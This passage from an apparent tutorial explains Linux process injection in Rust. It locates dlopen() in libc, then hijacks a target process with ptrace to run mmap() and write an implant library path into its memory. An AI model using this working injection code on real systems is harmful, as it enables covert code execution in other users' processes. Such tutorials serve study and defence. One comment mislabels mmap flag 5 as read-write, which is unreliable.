content-org/linux_process_injection.org
*** Get Function Address
To later use ~dlopen()~ for loading a library, we need to first locate the function within the loaded ~libc~ version.
In the previous step, we obtained the map for ~libc~, which also contains the absolute path to the ~libc.so~ library.
So instead of searching the copy loaded by the target process, we can read and search the original file from disk.

#+begin_src rust
  /// Find an offset of a given function in a given ELF file by resolving symbols
  fn get_function_offset(filename: &str, function_name: &str) -> Option<u64> {
      let data = std::fs::read(filename).expect("Cant read libc!");
      let obj = Elf::parse(&data).expect("Failed to parse ELF file");

      fn find_offset(symtab: &goblin::elf::Symtab, strtab:  &goblin::strtab::Strtab, function_name: &str) -> Option<u64> {
          symtab.iter().find(|sym| {
              if let Some(Ok(name_bytes)) = strtab.get(sym.st_name as usize) {
                  if let Ok(name) = std::str::from_utf8(name_bytes.as_bytes()) {
                      return name.trim_end_matches('\0') == function_name;
                  }
              }
              false
          }).map(|sym| sym.st_value)
      }

      // Try to find the function in dynsyms first
      if let Some(offset) = find_offset(&obj.dynsyms, &obj.dynstrtab, function_name) {
          return Some(offset);
      }

      // If not found in dynsyms, search in syms
      find_offset(&obj.syms, &obj.strtab, function_name)
  }
#+end_src

After parsing the ~libc~ library using [[https://docs.rs/goblin/latest/goblin/index.html][goblin]], we can iterate over the symbol tables to find the desired function name.

#+begin_quote
Each ELF file includes two tables: the dynamic symbol table (~.dynsym~) and the symbol table (~.symtab~).
The dynamic symbol table provides information about exported symbols, such as functions or variables, that are available for dynamic linking.
For instance, a public function in a shared library.
This table is used at runtime when the ELF is loaded to resolve the symbols so that other programs can use and reference the exported symbols.
The symbol table, primarily utilized for debugging purposes, includes all symbols, even those not intended for external use.
But when a binary is stripped, all debugging information and symbols not needed for dynamic linking are removed (stripped) from both tables.
#+end_quote

#+begin_src c
  // Symbol Table Struct
  typedef struct {
          Elf64_Word	st_name;
          unsigned char	st_info;
          unsigned char	st_other;
          Elf64_Half	st_shndx;
          Elf64_Addr	st_value;
          Elf64_Xword	st_size;
  } Elf64_Sym;
#+end_src

The symbol table includes the name and address of each symbol.
By iterating over the symbol table, we can use the ~st_name~, an index into the symbol string table, to get the symbol name.
If the name matches the desired function name, the associated ~st_value~ will give us the function's offset from the library's base address.

#+begin_quote
An alternative and probably easier approach to get a function offset would be to use the [[https://slog-rs.github.io/slog/libc/index.html][libc]] crate to ~dlopen()~ the ~libc.so~ in
our injector process and use its ~dlsym()~ to get the address of ~dlopen()~ in the newly loaded copy of ~libc~.

#+begin_src c
  handle = dlopen("libc.so");
  addr = dlsym(handle, "dlopen\0");
#+end_src
#+end_quote

*** Process Manipulation
To perform the final steps, we will inject instructions and modify register values of the target process.
First, we have to make it allocate some memory (or find some code caves to write to), where we then write the path to the implant library.
Finally, we make it call ~dlopen()~ to load and run the library.

Before manually overwriting instructions and registers, it is necessary to save the state of the process to be restored later.

#+begin_src rust
  struct Snapshot {
      registers: user_regs_struct,
      instruction: i64,
      pid: Pid,
  }
#+end_src

#+begin_src rust
  impl Snapshot {
      fn new(pid: Pid) -> Result<Self, nix::Error> {
          // Get and save the current register values of the target process
          let registers = ptrace::getregs(pid)?;

          // Save the instruction at the current rip
          let instruction = ptrace::read(pid, registers.rip as *mut c_void)?;

          Ok(Self {
              registers,
              instruction,
              pid,
          })
      }

      fn restore(self) -> Result<(), nix::Error> {
          // Restore the original registers
          ptrace::setregs(self.pid, self.registers)?;

          // Restore the saved instruction
          unsafe {
              ptrace::write(
                  self.pid,
                  self.registers.rip as *mut c_void,
                  self.instruction as *mut c_void,
              )?
          };
          Ok(())
      }
  }
#+end_src

The ~Snapshot~ struct holds both the registers and the next instruction at the point where the snapshot was taken.
The process can later be restored to its original state by calling ~restore()~.

*** Allocate Memory
To allocate memory, we make the target process trigger the [[https://www.man7.org/linux/man-pages/man2/mmap.2.html][~mmap()~]] system call,
which creates a new mapping in the virtual address space and returns the address.

#+begin_src rust
  // Attach to the target process
  ptrace::attach(pid)?;

  // Wait until the process stops
  waitpid(pid, None)?;

  let snapshot = Snapshot::new(pid)?;
  let mut regs = snapshot.registers.clone();

  // Set up the registers for the mmap() system call
  regs.rax = 9; // syscall for mmap()
  regs.rdi = 0;
  regs.rsi = so_path.len() as u64;
  regs.rdx = 5; // PROT_WRITE | PROT_READ
  regs.r10 = 0x22; // MAP_ANONYMOUS | MAP_PRIVATE
  regs.r8 = u64::MAX;
  regs.r9 = 0;

  // Overwrite registers
  ptrace::setregs(pid, regs)?;

  // Overwrite the instruction with a syscall (0x50f)
  unsafe { ptrace::write(pid, regs.rip as *mut c_void, 0x50f as *mut c_void)? };

  // Execute mmap() to map a new page
  ptrace::step(pid, None)?;
  waitpid(pid, None)?;

  // Get the address of the new page
  let mut regs_updated = ptrace::getregs(pid)?;
  let address = regs_updated.rax;

  snapshot.restore()?;
#+end_src

First, we attach to the remote process and wait for it to stop.
Next, we take a snapshot and set up the registers for the ~mmap~ system call.
We pass the length of the path and the desired access permissions for the new map.
Then we overwrite the instruction that would be executed next with the ~syscall~ instruction.

Using ~ptrace~, we execute the next instruction, which is the system call.
We then save the address of the new map, which is returned in ~rax~ by ~mmap~.
Finally, by using our snapshot, we restore the state of the process.


*** Write Library Path
Given the address of the new map, we can write the path of the implant library to the target's memory.

#+begin_src rust
  // Write the shared object path to the new page in the target process memory
  let path_bytes = so_path.as_bytes();
  for chunk in path_bytes.chunks(8) {
      let mut padded_chunk = [0u8; 8];
      for (i, &byte) in chunk.iter().enumerate() {
          padded_chunk[i] = byte;
      }
      unsafe {
          ptrace::write(
              pid,
              regs_updated.rax as *mut c_void,
              u64::from_ne_bytes(padded_chunk) as *mut c_void,
          )?
      };
      regs_updated.rax += 8;
  }

  ptrace::detach(pid, None)?;

  // Return address of path in target process memory
  Ok(address)
#+end_src

